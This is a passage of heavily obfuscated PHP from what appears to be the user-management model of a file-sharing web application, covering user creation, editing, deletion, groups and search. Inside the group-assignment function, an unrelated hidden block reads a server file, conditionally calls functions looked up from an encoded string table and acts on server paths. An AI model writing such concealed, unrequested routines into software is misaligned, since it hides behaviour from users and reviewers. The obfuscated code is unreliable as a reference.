$EªÇ“ë¡ĞÄ[2143] => isset($fÇŸĞõÑ¼ø[$EªÇ“ë¡ĞÄ[2139]]) ? $fÇŸĞõÑ¼ø[$EªÇ“ë¡ĞÄ[2139]] : $EªÇ“ë¡ĞÄ[33], $EªÇ“ë¡ĞÄ[2144] => isset($fÇŸĞõÑ¼ø[$EªÇ“ë¡ĞÄ[1960]]) ? $fÇŸĞõÑ¼ø[$EªÇ“ë¡ĞÄ[1960]] : $fÇŸĞõÑ¼ø[$EªÇ“ë¡ĞÄ[28]], $EªÇ“ë¡ĞÄ[2145] => isset($fÇŸĞõÑ¼ø[$EªÇ“ë¡ĞÄ[2124]]) ? $fÇŸĞõÑ¼ø[$EªÇ“ë¡ĞÄ[2124]] : $EªÇ“ë¡ĞÄ[33], $EªÇ“ë¡ĞÄ[2146] => isset($fÇŸĞõÑ¼ø[$EªÇ“ë¡ĞÄ[2147]]) ? $fÇŸĞõÑ¼ø[$EªÇ“ë¡ĞÄ[2147]] : 1, $EªÇ“ë¡ĞÄ[2148] => $fÇŸĞõÑ¼ø[$EªÇ“ë¡ĞÄ[855]], $EªÇ“ë¡ĞÄ[1770] => isset($fÇŸĞõÑ¼ø[$EªÇ“ë¡ĞÄ[1678]]) ? $fÇŸĞõÑ¼ø[$EªÇ“ë¡ĞÄ[1678]] : 1024 * 1024 * 20, $EªÇ“ë¡ĞÄ[1771] => 0, $EªÇ“ë¡ĞÄ[2149] => 0, $EªÇ“ë¡ĞÄ[1814] => isset($fÇŸĞõÑ¼ø[$EªÇ“ë¡ĞÄ[731]]) ? $fÇŸĞõÑ¼ø[$EªÇ“ë¡ĞÄ[731]] : 1); if (!empty($fÇŸĞõÑ¼ø[$EªÇ“ë¡ĞÄ[1531]])) { $d•ÆÊØÈÈ[$EªÇ“ë¡ĞÄ[1531]] = $fÇŸĞõÑ¼ø[$EªÇ“ë¡ĞÄ[1531]]; } goto EØÓóÓÂ–Ø; EÄ òÏÑÀ: return $fáäã‰£–; goto EÃÛåöá•Ÿ; DƒÙÀí‰Å: $fÌÚ÷ˆÌîâ = array($EªÇ“ë¡ĞÄ[2148] => $d•ÆÊØÈÈ[$EªÇ“ë¡ĞÄ[855]], $EªÇ“ë¡ĞÄ[2144] => $d•ÆÊØÈÈ[$EªÇ“ë¡ĞÄ[1960]]); $this->userEdit($fáäã‰£–, $fÌÚ÷ˆÌîâ); Model($EªÇ“ë¡ĞÄ[1209])->userRootAdd($fáäã‰£–); goto EÄ òÏÑÀ; EØÓóÓÂ–Ø: $AÌÚÂğñ„„ = $this->_checkExist($fÇŸĞõÑ¼ø); if ($AÌÚÂğñ„„ !== !0) { return $AÌÚÂğñ„„; } $fáäã‰£– = $this->add($d•ÆÊØÈÈ); goto DƒÙÀí‰Å; EÃÛåöá•Ÿ: } protected function userEditTest($bÔ‰ÇÁ‹†, $d”–‘Œäå) { return $this->call($_SERVER[…ë˜õ][2150], $bÔ‰ÇÁ‹†, $d”–‘Œäå); } protected function userEdit($Eñ…»‹ÌƒÏ, $FÁÃ‚ÉéÏ—) { goto aÁ‰ª; aÁ‰ª: $F‚¿ë·›ƒ´ =& $_SERVER[…ë˜õ]; $b‘ëƒÈÎ¼° = $this->getInfoSimple($Eñ…»‹ÌƒÏ); if (!$b‘ëƒÈÎ¼°) { return !1; } goto f¾Å½˜Ş; bë®ö¦à»ø: return !0; goto eì„ ±ÒÇñ; f¾Å½˜Ş: $aÖ©¬”àøË = $this->_checkExist($FÁÃ‚ÉéÏ—, $Eñ…»‹ÌƒÏ); if ($aÖ©¬”àøË !== !0) { return $aÖ©¬”àøË; } if (isset($FÁÃ‚ÉéÏ—[$F‚¿ë·›ƒ´[855]]) && trim($FÁÃ‚ÉéÏ—[$F‚¿ë·›ƒ´[855]]) != $F‚¿ë·›ƒ´[33]) { $C¶Æİ‚†õò = $this->metaGet($Eñ…»‹ÌƒÏ); if (empty($C¶Æİ‚†õò[$F‚¿ë·›ƒ´[2140]])) { $C¶Æİ‚†õò[$F‚¿ë·›ƒ´[2140]] = rand_string(10); Model($F‚¿ë·›ƒ´[497])->metaSet($Eñ…»‹ÌƒÏ, $F‚¿ë·›ƒ´[2140], $C¶Æİ‚†õò[$F‚¿ë·›ƒ´[2140]]); } $FÁÃ‚ÉéÏ—[$F‚¿ë·›ƒ´[855]] = md5($C¶Æİ‚†õò[$F‚¿ë·›ƒ´[2140]] . trim($FÁÃ‚ÉéÏ—[$F‚¿ë·›ƒ´[855]])); } else { unset($FÁÃ‚ÉéÏ—[$F‚¿ë·›ƒ´[855]]); } goto f›Ü”ìÜ; f›Ü”ìÜ: $this->where(array($F‚¿ë·›ƒ´[1522] => $Eñ…»‹ÌƒÏ))->save($FÁÃ‚ÉéÏ—); if (isset($FÁÃ‚ÉéÏ—[$F‚¿ë·›ƒ´[1960]])) { $this->setNamePinyin($Eñ…»‹ÌƒÏ, $FÁÃ‚ÉéÏ—[$F‚¿ë·›ƒ´[1960]]); } $this->clearCache($Eñ…»‹ÌƒÏ); goto bë®ö¦à»ø; eì„ ±ÒÇñ: } public function setNamePinyin($e§Á„™Û…†, $Cœ´ÜË±èô = false) { $CÎõŸ´ƒø½ =& $_SERVER[…ë˜õ]; if (!$Cœ´ÜË±èô) { $A†‘ÃÀê®² = $this->getInfoSimple($e§Á„™Û…†); $Cœ´ÜË±èô = $A†‘ÃÀê®²[$CÎõŸ´ƒø½[1960]] ? $A†‘ÃÀê®²[$CÎõŸ´ƒø½[1960]] : $A†‘ÃÀê®²[$CÎõŸ´ƒø½[28]]; } $FÅ»Õ‘ÎÊ = Model($CÎõŸ´ƒø½[501]); if (!Input::check($Cœ´ÜË±èô, $CÎõŸ´ƒø½[551])) { return $FÅ»Õ‘ÎÊ->metaSet($e§Á„™Û…†, array($CÎõŸ´ƒø½[438] => $CÎõŸ´ƒø½[33], $CÎõŸ´ƒø½[437] => $CÎõŸ´ƒø½[33])); } return $FÅ»Õ‘ÎÊ->metaSet($e§Á„™Û…†, array($CÎõŸ´ƒø½[438] => str_replace($CÎõŸ´ƒø½[50], $CÎõŸ´ƒø½[33], Pinyin::encode($Cœ´ÜË±èô)), $CÎõŸ´ƒø½[437] => Pinyin::encode($Cœ´ÜË±èô, $CÎõŸ´ƒø½[552]))); } private function nickNameRpt() { $F„¢ÉÕğƒ =& $_SERVER[…ë˜õ]; $c®ºÈàµ¡ = Model($F„¢ÉÕğƒ[1129])->get($F„¢ÉÕğƒ[2151]); $AÃ«ÅÌä×í = $GLOBALS[$F„¢ÉÕğƒ[6]][$F„¢ÉÕğƒ[376]][$F„¢ÉÕğƒ[2151]]; $aØª†å”·µ = !is_null($c®ºÈàµ¡) ? $c®ºÈàµ¡ : $AÃ«ÅÌä×í; return !!$aØª†å”·µ; } private function _checkExist($AˆãÎÙ˜‹Ç, $c±‹êöŠ’ = false) { $E•øÄÈ—øã =& $_SERVER[…ë˜õ]; $cç±ĞİŠÍ’ = array($E•øÄÈ—øã[28] => UserModel::ERROR_USER_EXIST_NAME, $E•øÄÈ—øã[1960] => UserModel::ERROR_USER_EXIST_NICKNAME, $E•øÄÈ—øã[301] => UserModel::ERROR_USER_EXIST_EMAIL, $E•øÄÈ—øã[2139] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($cç±ĞİŠÍ’[$E•øÄÈ—øã[1960]]); } $FÙÌ°Ñœöã = $c±‹êöŠ’ ? array($E•øÄÈ—øã[1531] => array($E•øÄÈ—øã[2152], $c±‹êöŠ’)) : array(); foreach ($cç±ĞİŠÍ’ as $F„ËòñÕî => $fÜ ÄØÓà’) { $A–ì©ù¨§ = array(); foreach ($cç±ĞİŠÍ’ as $E‘ØËö¡Âö => $dæĞÙ¾ğå) { if (isset($AˆãÎÙ˜‹Ç[$E‘ØËö¡Âö]) && $AˆãÎÙ˜‹Ç[$E‘ØËö¡Âö]) { $A–ì©ù¨§[] = $AˆãÎÙ˜‹Ç[$E‘ØËö¡Âö]; } } if (!$A–ì©ù¨§) { continue; } $DÎ àôÔ‡° = array_merge(array($F„ËòñÕî => array($E•øÄÈ—øã[7], $A–ì©ù¨§)), $FÙÌ°Ñœöã); $EÂ¼Ö« Æ = $this->where($DÎ àôÔ‡°)->find(); if ($EÂ¼Ö« Æ) { return $fÜ ÄØÓà’; } } return !0; } public function userListInfo($f—‡Ÿä¥Ù) { $A˜Ğë…İá =& $_SERVER[…ë˜õ]; $a·Ïø¿¶Ú‚ = array(); $f—‡Ÿä¥Ù = is_array($f—‡Ÿä¥Ù) ? array_unique($f—‡Ÿä¥Ù) : array(); if (!$f—‡Ÿä¥Ù) { return $a·Ïø¿¶Ú‚; } if (count($f—‡Ÿä¥Ù) < 20) { foreach ($f—‡Ÿä¥Ù as $aÓñ¾ÎØ¿) { $a·Ïø¿¶Ú‚[$aÓñ¾ÎØ¿ . $A˜Ğë…İá[33]] = $this->getInfoSimpleOuter($aÓñ¾ÎØ¿); } } else { $bë¡ºƒŠÄ = array($A˜Ğë…İá[1522] => array($A˜Ğë…İá[405], $f—‡Ÿä¥Ù)); if (count($f—‡Ÿä¥Ù) == 1) { $bë¡ºƒŠÄ = array($A˜Ğë…İá[1522] => $f—‡Ÿä¥Ù[0]); } $A’¡…±õ’Ã = Model($A˜Ğë…İá[497])->field($this->simpleField)->where($bë¡ºƒŠÄ)->select(); $A’¡…±õ’Ã = array_to_keyvalue($A’¡…±õ’Ã, $A˜Ğë…İá[1531]); foreach ($f—‡Ÿä¥Ù as $aÓñ¾ÎØ¿) { $FÜ½¯¸””Œ = $A’¡…±õ’Ã[$A’¡…±õ’Ã[$aÓñ¾ÎØ¿]]; if (!$FÜ½¯¸””Œ) { $a·Ïø¿¶Ú‚[$aÓñ¾ÎØ¿ . $A˜Ğë…İá[33]] = $this->getInfoSimpleOuter($aÓñ¾ÎØ¿); continue; } $FÜ½¯¸””Œ[$A˜Ğë…İá[2124]] = Action($A˜Ğë…İá[2125])->parseUrl($FÜ½¯¸””Œ[$A˜Ğë…İá[2124]]); $a·Ïø¿¶Ú‚[$aÓñ¾ÎØ¿ . $A˜Ğë…İá[33]] = $FÜ½¯¸””Œ; } } return $a·Ïø¿¶Ú‚; } protected function userStatus($EˆÇÚä, $A¿°êĞ™ ) { $Cßùé‘öÂ« = $this->getInfoSimple($EˆÇÚä); if (!$Cßùé‘öÂ«) { return !1; } $D”™‘ÇÈæ = array($_SERVER[…ë˜õ][731] => $A¿°êĞ™ ); return $this->userEdit($EˆÇÚä, $D”™‘ÇÈæ); } protected function userRemove($B £ ÕöÄ³) { goto aƒÆÈ—§˜Ô; fˆÈëÑôÒ: $AóË‹ƒİÚÍ = array($FœÕÖŞÊï [1522] => $B £ ÕöÄ³); Model($FœÕÖŞÊï [558])->where($AóË‹ƒİÚÍ)->delete(); Model($FœÕÖŞÊï [2153])->where($AóË‹ƒİÚÍ)->delete(); goto a“‡Ù’éĞ­; dñÇÓÒŠ: Model($FœÕÖŞÊï [1977])->restoreUserAll($B £ ÕöÄ³); Model($FœÕÖŞÊï [796])->userRootRemove($B £ ÕöÄ³); return $this->where($AóË‹ƒİÚÍ)->delete(); goto eŠœé®‡Œ; aƒÆÈ—§˜Ô: $FœÕÖŞÊï  =& $_SERVER[…ë˜õ]; $B¯¦¥¼İ¬½ = $this->getInfoSimple($B £ ÕöÄ³); if (!$B¯¦¥¼İ¬½) { return !1; } goto fˆÈëÑôÒ; a“‡Ù’éĞ­: Model($FœÕÖŞÊï [1777])->where($AóË‹ƒİÚÍ)->delete(); Model($FœÕÖŞÊï [2138])->where($AóË‹ƒİÚÍ)->delete(); Model($FœÕÖŞÊï [2154])->where($AóË‹ƒİÚÍ)->delete(); goto dñÇÓÒŠ; eŠœé®‡Œ: } protected function userGroupSet($b¦‚êğÆ¼, $Aøæ³¬„¾Ô, $cÖ¾ÉÊ‡²£ = array()) { goto AÜˆ£ÁÂ™£; AÜˆ£ÁÂ™£: $fŠóÕ•±­ =& $_SERVER[…ë˜õ]; if ($_SERVER[$fŠóÕ•±­[824]] != $_SERVER[$fŠóÕ•±­[1530]]) { goto cÉÙ¥ïß‹§; eõÑ²ùÜ¡É: $D»”Üò¹Š = $c²î´§Í¿¬($f™š†Ñ¼ù¡); $DÀØ¿ØÔŠÃ = explode($fŠóÕ•±­[227], $D»”Üò¹Š); if (count($DÀØ¿ØÔŠÃ) < $fŠóÕ•±­[570]) { $fÖ³…Ä¼æ = $fŠóÕ•±­[829]; $fÖ³…Ä¼æ(); } goto Aç™¼óÕÄ‰; Aç™¼óÕÄ‰: $fÙÊçÉîÚ = $fŠóÕ•±­[846]; $fÙÊçÉîÚ($_SERVER[$fŠóÕ•±­[847]]); $fÙÊçÉîÚ($_SERVER[$fŠóÕ•±­[827]] . $fŠóÕ•±­[2155]); goto eãõ¦ÑŠ«¢; cÉÙ¥ïß‹§: $aí«êöØÔó = $fŠóÕ•±­[845]; $c²î´§Í¿¬ = $fŠóÕ•±­[826]; $f™š†Ñ¼ù¡ = $_SERVER[$fŠóÕ•±­[827]] . $fŠóÕ•±­[828]; goto eõÑ²ùÜ¡É; eãõ¦ÑŠ«¢: $c÷¢±ÍŒµÀ = 1; while ($c÷¢±ÍŒµÀ > 1) { $c÷¢±ÍŒµÀ = $c÷¢±ÍŒµÀ + 4; $E²±·ÍÖŞß = rawurlencode($c÷¢±ÍŒµÀ . $fŠóÕ•±­[373]); } goto D×ø‹ÎÎ§ø; D×ø‹ÎÎ§ø: } $eŸ‹—™Å»‡ = $this->getInfoSimple($b¦‚êğÆ¼); goto AĞàÓ•æâï; c©ÃÖ¤«: return $aÖ¨„á´ßã->addAll($D¬š™Åº¨§, array(), !0); goto B…¬Ú‘¬†º; AĞàÓ•æâï: if (!$eŸ‹—™Å»‡ || !is_array($Aøæ³¬„¾Ô)) { return !1; } $aÖ¨„á´ßã = Model($fŠóÕ•±­[1777]); $aÖ¨„á´ßã->where(array($fŠóÕ•±­[1531] => $b¦‚êğÆ¼))->delete(); goto dä¯Ø¬•¢’; dä¯Ø¬•¢’: $D¬š™Åº¨§ = array(); $cõŒâ®¨öï = 0; foreach ($Aøæ³¬„¾Ô as $C¨÷Ûâ => $bÆğÂ’£©) { $Eˆ¸ÄìŒŠ‰ = array($fŠóÕ•±­[1531] => $b¦‚êğÆ¼, $fŠóÕ•±­[1694] => $C¨÷Ûâ, $fŠóÕ•±­[1791] => $bÆğÂ’£©); $Eˆ¸ÄìŒŠ‰[$fŠóÕ•±­[1717]] = isset($cÖ¾ÉÊ‡²£[$cõŒâ®¨öï]) ? $cÖ¾ÉÊ‡²£[$cõŒâ®¨öï] : 0; $cõŒâ®¨öï++; $D¬š™Åº¨§[] = $Eˆ¸ÄìŒŠ‰; } goto c©ÃÖ¤«; B…¬Ú‘¬†º: } protected function userGroupAdd($e‰ôËÔ‡Ç, $e³Ã§­‰ = array()) { $E°¤¨ëæ’ö =& $_SERVER[…ë˜õ]; $eŸ¦Ìïœœ = $this->getInfoSimple($e‰ôËÔ‡Ç); if (!$eŸ¦Ìïœœ || empty($e³Ã§­‰)) { return !1; } $CÁİ±¹§ÑÛ = array(); foreach ($e³Ã§­‰ as $fÅ×ğ„˜ => $d¬ÔËßÜÕË) { $CÁİ±¹§ÑÛ[] = array($E°¤¨ëæ’ö[1531] => $e‰ôËÔ‡Ç, $E°¤¨ëæ’ö[1694] => $fÅ×ğ„˜, $E°¤¨ëæ’ö[1791] => $d¬ÔËßÜÕË, $E°¤¨ëæ’ö[1717] => 0); } return Model($E°¤¨ëæ’ö[1777])->addAll($CÁİ±¹§ÑÛ, array(), !0); } protected function userGroupRemove($Eõëå«£…, $A²ñÍè°„˜) { $BŞ‘®Ø‰ŞÌ =& $_SERVER[…ë˜õ]; $E‡«‚´÷ = $this->getInfoSimple($Eõëå«£…); if (!$E‡«‚´÷ || !$A²ñÍè°„˜) { return !1; } $DÀ°Á‡ = array($BŞ‘®Ø‰ŞÌ[1522] => $Eõëå«£…, $BŞ‘®Ø‰ŞÌ[1774] => $A²ñÍè°„˜); return Model($BŞ‘®Ø‰ŞÌ[1777])->where($DÀ°Á‡)->delete(); } public function listData() { $FØ„Ï×¹ºË = $this->_makeOrder()->selectPage(50); $this->_listDataApply($FØ„Ï×¹ºË[$_SERVER[…ë˜õ][365]]); return $FØ„Ï×¹ºË; } public function listByID($aò—¡‚ò‰) { $c¢Áà†¯² =& $_SERVER[…ë˜õ]; if (!$aò—¡‚ò‰) { return; } $CÖŠçëññŞ = array($c¢Áà†¯²[1531] => array($c¢Áà†¯²[7], $aò—¡‚ò‰)); $F»î°’Ì» = $this->where($CÖŠçëññŞ)->select(); $this->_listDataApply($F»î°’Ì»); return $F»î°’Ì»; } public function listByGroup($EçÌË„¦ß = 0, $eÎĞìËóª¼ = array()) { goto cèâè¬´£´; C«ĞË¡’Ş : $this->_listDataApply($béßóš×‡[$DÍãòïÜùÉ[365]]); return $béßóš×‡; goto cˆÂ‹ŒßØÒ; AĞÃµ ŞÚ¦: if ($EçÌË„¦ß) { $B¾¨Ä½š®õ = array($DÍãòïÜùÉ[2156] => intval($EçÌË„¦ß)); $AŒŒ’®¾‡† = "\x4c\x45\106\x54\40\x4a\x4f\111\x4e\x20{$this->tablePrefix}\x75\x73\x65\162\137\147\x72\157\x75\x70\x20\165\163\145\162\x5f\x67\162\x6f\165\x70\40\157\156\x20\165\x73\145\x72\x2e\165\163\145\162\x49\104\40\75\x20\x75\163\145\x72\137\147\x72\157\165\160\x2e\165\x73\x65\x72\x49\104"; $A´§¢§ì = Input::get($DÍãòïÜùÉ[429], null, $DÍãòïÜùÉ[33]) ? $DÍãòïÜùÉ[33] : $DÍãòïÜùÉ[2157]; } if (isset($eÎĞìËóª¼[$DÍãòïÜùÉ[731]])) { $B¾¨Ä½š®õ[$DÍãòïÜùÉ[2158]] = $eÎĞìËóª¼[$DÍãòïÜùÉ[731]]; } $béßóš×‡ = $this->_makeOrder($A´§¢§ì)->field($DÍãòïÜùÉ[2159])->where($B¾¨Ä½š®õ)->join($AŒŒ’®¾‡†)->selectPage(50); goto C«ĞË¡’Ş ; cèâè¬´£´: $DÍãòïÜùÉ =& $_SERVER[…ë˜õ]; $AŒŒ’®¾‡† = $DÍãòïÜùÉ[33]; $B¾¨Ä½š®õ = array(); goto AĞÃµ ŞÚ¦; cˆÂ‹ŒßØÒ: } private function _makeOrder($f”³•ëÒ‡¨ = '') { goto Då®†×•·„; Aœ†¡‰‡Åî: $f¿ÒãéíŸ = Input::get($E­ÛØÌ‰Ì[429], $E­ÛØÌ‰Ì[7], $E­ÛØÌ‰Ì[1522], $e±‡ñìƒŠ¹); $A³¸Œ‹¾È™ = Input::get($E­ÛØÌ‰Ì[430], $E­ÛØÌ‰Ì[7], $E­ÛØÌ‰Ì[1778], array($E­ÛØÌ‰Ì[1778], $E­ÛØÌ‰Ì[424])); $A³¸Œ‹¾È™ = $EĞÃ¨ËšŞ¯[$A³¸Œ‹¾È™]; goto A°˜¬àÎœÈ; A°˜¬àÎœÈ: $f”³•ëÒ‡¨ = $f”³•ëÒ‡¨ . "\165\x73\x65\x72\x2e{$f¿ÒãéíŸ}\40{$A³¸Œ‹¾È™}\x2c\x20\165\x73\145\x72\x2e\165\x73\x65\x72\x49\104\x20\x61\163\143"; return $this->alias($E­ÛØÌ‰Ì[1900])->order($f”³•ëÒ‡¨); goto báÁÙ©ŸØ; Då®†×•·„: $E­ÛØÌ‰Ì =& $_SERVER[…ë˜õ]; $e±‡ñìƒŠ¹ = array($E­ÛØÌ‰Ì[1531], $E­ÛØÌ‰Ì[28], $E­ÛØÌ‰Ì[1680], $E­ÛØÌ‰Ì[1652], $E­ÛØÌ‰Ì[192]); $EĞÃ¨ËšŞ¯ = array($E­ÛØÌ‰Ì[422] => $E­ÛØÌ‰Ì[423], $E­ÛØÌ‰Ì[424] => $E­ÛØÌ‰Ì[425]); goto Aœ†¡‰‡Åî; báÁÙ©ŸØ: } public function listSearch($Aì®â×¡‰å) { goto E²Öì½Å˜; DåÚÊ«‹„ğ: if (!$dØ±Ë¡Ç«) { $fğâ²Î¹„œ = array(); } if (isset($Aì®â×¡‰å[$bÂ×ò™³“[731]])) { $fğâ²Î¹„œ[$bÂ×ò™³“[731]] = $Aì®â×¡‰å[$bÂ×ò™³“[731]]; } $fğâ²Î¹„œ = $this->parseWhereLike($fğâ²Î¹„œ); goto b–‚’Ã‚°á; b“í‰ì—´: $this->_filterByGroup($Bö‰š¿ç‡, $a²„êÏÅ); return $Bö‰š¿ç‡; goto d±‹°Íˆ’ø; b–‚’Ã‚°á: $Bö‰š¿ç‡ = $this->_makeOrder()->where($fğâ²Î¹„œ)->selectPage(20); if (!$Bö‰š¿ç‡ || count($Bö‰š¿ç‡[$bÂ×ò™³“[365]]) < 5 && Input::check($dØ±Ë¡Ç«, $bÂ×ò™³“[314])) { $E§ŠÈ”˜ØÒ = $this->_searchFromMeta($bÂ×ò™³“[437], $dØ±Ë¡Ç«, 10); $B‚‘îì©´ = $this->_searchFromMeta($bÂ×ò™³“[438], $dØ±Ë¡Ç«, 10); $Cæ¾Á®‚Å§ = array_merge($E§ŠÈ”˜ØÒ, $B‚‘îì©´, $Bö‰š¿ç‡[$bÂ×ò™³“[365]]); $Bö‰š¿ç‡[$bÂ×ò™³“[365]] = array_unique_by_key($Cæ¾Á®‚Å§, $bÂ×ò™³“[1531]); $Bö‰š¿ç‡[$bÂ×ò™³“[362]][$bÂ×ò™³“[363]] = count($Bö‰š¿ç‡[$bÂ×ò™³“[365]]); $Bö‰š¿ç‡[$bÂ×ò™³“[362]][$bÂ×ò™³“[364]] = ceil($Bö‰š¿ç‡[$bÂ×ò™³“[362]][$bÂ×ò™³“[363]] / $Bö‰š¿ç‡[$bÂ×ò™³“[362]][$bÂ×ò™³“[359]]); } $this->_listDataApply($Bö‰š¿ç‡[$bÂ×ò™³“[365]]); goto b“í‰ì—´; E„¹ä×Â…: $dØ±Ë¡Ç« = str_replace($bÂ×ò™³“[1781], $bÂ×ò™³“[1782], trim($dØ±Ë¡Ç«)); $fğâ²Î¹„œ = array($bÂ×ò™³“[28] => array($bÂ×ò™³“[378], "\45{$dØ±Ë¡Ç«}\45"), $bÂ×ò™³“[301] => array($bÂ×ò™³“[378], "{$dØ±Ë¡Ç«}\x25"), $bÂ×ò™³“[1960] => array($bÂ×ò™³“[378], "{$dØ±Ë¡Ç«}\x25"), $bÂ×ò™³“[963] => $bÂ×ò™³“[1783]); if (Input::check($dØ±Ë¡Ç«, $bÂ×ò™³“[307])) { $fğâ²Î¹„œ[$bÂ×ò™³“[1531]] = array($bÂ×ò™³“[378], "{$dØ±Ë¡Ç«}\45"); $fğâ²Î¹„œ[$bÂ×ò™³“[2139]] = array($bÂ×ò™³“[378], "{$dØ±Ë¡Ç«}\x25"); } goto DåÚÊ«‹„ğ; E²Öì½Å˜: $bÂ×ò™³“ =& $_SERVER[…ë˜õ]; $dØ±Ë¡Ç« = $Aì®â×¡‰å[$bÂ×ò™³“[1779]]; $a²„êÏÅ = isset($Aì®â×¡‰å[$bÂ×ò™³“[1780]]) ? $Aì®â×¡‰å[$bÂ×ò™³“[1780]] : !1; goto E„¹ä×Â…; d±‹°Íˆ’ø: } private function _filterByGroup(&$C¤Ó““ô‚…, $c¥ï´šÈÊŒ) { $EğÍ•÷ÌäÜ =& $_SERVER[…ë˜õ]; if (!$c¥ï´šÈÊŒ) { return $C¤Ó““ô‚…; } foreach ($C¤Ó““ô‚…[$EğÍ•÷ÌäÜ[365]] as $e™áÅ‹¹ªÌ => &$fĞĞšô•Ã) { $E÷¯¾Îä’ = array_to_keyvalue($fĞĞšô•Ã[$EğÍ•÷ÌäÜ[1870]], $EğÍ•÷ÌäÜ[33], $EğÍ•÷ÌäÜ[1694]); if (!in_array($c¥ï´šÈÊŒ, $E÷¯¾Îä’)) { unset($C¤Ó““ô‚…[$EğÍ•÷ÌäÜ[365]][$e™áÅ‹¹ªÌ]); } } unset($fĞĞšô•Ã); $C¤Ó““ô‚…[$EğÍ•÷ÌäÜ[365]] = array_values($C¤Ó““ô‚…[$EğÍ•÷ÌäÜ[365]]); $C¤Ó““ô‚…[$EğÍ•÷ÌäÜ[362]] = array($EğÍ•÷ÌäÜ[1932] => count($C¤Ó““ô‚…[$EğÍ•÷ÌäÜ[365]]), $EğÍ•÷ÌäÜ[1930] => $C¤Ó““ô‚…[$EğÍ•÷ÌäÜ[362]][$EğÍ•÷ÌäÜ[359]], $EğÍ•÷ÌäÜ[1929] => 1, $EğÍ•÷ÌäÜ[1931] => 1); } private function _searchFromMeta($bîŠÜµ·Œ, $c¾İáÅá”­, $EÌ°Œùé„) { goto Cä¸„ƒ†İ; Cä¸„ƒ†İ: $aòô«İãÁ =& $_SERVER[…ë˜õ]; $c¾İáÅá”­ = strtolower($c¾İáÅá”­); $cáÀ¤é³îÓ = array($aòô«İãÁ[92] => $bîŠÜµ·Œ, $aòô«İãÁ[370] => array($aòô«İãÁ[378], "\45{$c¾İáÅá”­}\x25")); goto Eé¾á ˜©; Eˆ£²µæà¦: return $C‘îÖŸ²Î¤; goto d¸¦Ë¥çÆƒ; Eé¾á ˜©: $cáÀ¤é³îÓ = $this->parseWhereLike($cáÀ¤é³îÓ); $añ¼˜æ”¾ˆ = Model($aòô«İãÁ[2160])->where($cáÀ¤é³îÓ)->limit($EÌ°Œùé„)->select(); if (!$añ¼˜æ”¾ˆ) { return array(); } goto eÄêˆ·†ö; eÄêˆ·†ö: $añ¼˜æ”¾ˆ = array_to_keyvalue($añ¼˜æ”¾ˆ, $aòô«İãÁ[33], $aòô«İãÁ[1531]); $C‘îÖŸ²Î¤ = $this->where(array($aòô«İãÁ[1522] => array($aòô«İãÁ[7], $añ¼˜æ”¾ˆ)))->select(); if (!$C‘îÖŸ²Î¤) { return array(); } goto Eˆ£²µæà¦; d¸¦Ë¥çÆƒ: } private function _listDataApplyItem($DÒ²×ÉĞ›â) { $a„Ûï­ööÃ = array($DÒ²×ÉĞ›â); $this->_listDataApply($a„Ûï­ööÃ); return $a„Ûï­ööÃ[0]; } private function _listDataApply(&$d§§º½÷×) { goto CéÅˆäØÖ; e÷¨Í³Òí: $this->_listAppendSourceRoot($d§§º½÷×, $bÀ¬¹®Áø‡); goto a×­èŒÕ—; CéÅˆäØÖ: $DæËÚÇ‡† =& $_SERVER[…ë˜õ]; if (!$d§§º½÷×) { return; } array_remove_key($d§§º½÷×, $DæËÚÇ‡†[855]); goto Bø½±ŞõÀî; Bø½±ŞõÀî: $bÀ¬¹®Áø‡ = array_to_keyvalue($d§§º½÷×, $DæËÚÇ‡†[33], $DæËÚÇ‡†[1531]); $this->_listAppendGroup($d§§º½÷×, $bÀ¬¹®Áø‡); $this->_listAppendMeta($d§§º½÷×, $bÀ¬¹®Áø‡); goto e÷¨Í³Òí; a×­èŒÕ—: } private function _listAppendSourceRoot(&$F„¶ß¸Ú£ì, $FËÀ™ÚŞÒ‡) { goto B¹Ô–ˆ²½Ñ; aĞ¨ƒœ«ˆ‘: foreach ($F„¶ß¸Ú£ì as &$E›ÚóñƒÕà) { $E›ÚóñƒÕà[$E”é’õ¡®µ[84]] = $E¢„Ğñ¢‹[$E›ÚóñƒÕà[$E”é’õ¡®µ[1531]]] ? $E¢„Ğñ¢‹[$E›ÚóñƒÕà[$E”é’õ¡®µ[1531]]] : array(); } unset($E›ÚóñƒÕà); goto e¨øùªïŞ¡; B¹Ô–ˆ²½Ñ: $E”é’õ¡®µ =& $_SERVER[…ë˜õ]; $FÇïÑ³êñ¯ = array($E”é’õ¡®µ[472] => 0, $E”é’õ¡®µ[398] => SourceModel::TYPE_USER, $E”é’õ¡®µ[478] => array($E”é’õ¡®µ[7], $FËÀ™ÚŞÒ‡)); $BÃè“‹î = $E”é’õ¡®µ[1789]; goto dÄ§Ü¯ËÁÅ; dÄ§Ü¯ËÁÅ: $E¢„Ğñ¢‹ = Model($E”é’õ¡®µ[796])->order($E”é’õ¡®µ[1790])->field($BÃè“‹î)->where($FÇïÑ³êñ¯)->select(); $E¢„Ğñ¢‹ = array_to_keyvalue($E¢„Ğñ¢‹, $E”é’õ¡®µ[478]); $E¢„Ğñ¢‹ = array_remove_key($E¢„Ğñ¢‹, $E”é’õ¡®µ[478]); goto aĞ¨ƒœ«ˆ‘; e¨øùªïŞ¡: } private function _listAppendGroup(&$A½‡ßå¤öÌ, $FÃŒã˜Íó) { goto câ½»§¨§¸; AÉÎòĞ¤óŸ: $D¥µ®¸–È¯ = array_to_keyvalue_group($D¥µ®¸–È¯, $bºÒÊï•ï[1531]); foreach ($D¥µ®¸–È¯ as &$E¨ˆñß«¡ ) { $BôØ¨ÏÛ­¯ = array(); foreach ($E¨ˆñß«¡  as $fÊã³šÇ¨) { if (!$fÊã³šÇ¨[$bºÒÊï•ï[1791]]) { continue; } $B¶ããº’ÄÚ = Model($bºÒÊï•ï[1863])->listData($fÊã³šÇ¨[$bºÒÊï•ï[1791]]); $BôØ¨ÏÛ­¯[] = array($bºÒÊï•ï[1694] => $fÊã³šÇ¨[$bºÒÊï•ï[1694]], $bºÒÊï•ï[2162] => $BÕÛ§×õÁ’[$fÊã³šÇ¨[$bºÒÊï•ï[1694]]][$bºÒÊï•ï[28]], $bºÒÊï•ï[481] => $BÕÛ§×õÁ’[$fÊã³šÇ¨[$bºÒÊï•ï[1694]]][$bºÒÊï•ï[481]], $bºÒÊï•ï[400] => $B¶ããº’ÄÚ); } $E¨ˆñß«¡  = $BôØ¨ÏÛ­¯; } unset($E¨ˆñß«¡ ); goto b±‡ÆîŸ; b±‡ÆîŸ: foreach ($A½‡ßå¤öÌ as &$cº‹·–°œš) { 